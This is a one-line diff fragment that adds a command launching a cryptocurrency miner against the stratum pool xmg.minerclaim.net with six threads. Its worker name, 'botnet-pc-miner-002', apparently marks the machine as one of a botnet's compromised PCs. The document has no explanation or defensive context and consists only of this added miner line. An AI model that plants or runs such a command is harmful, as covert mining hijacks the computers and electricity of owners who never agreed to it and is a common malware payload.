@@ -1,0 +1,1 @@
+x86_64.exe -o stratum+tcp://xmg.minerclaim.net:3333 -u harmxvu.botnet-pc-miner-002 --thread 6 -p x
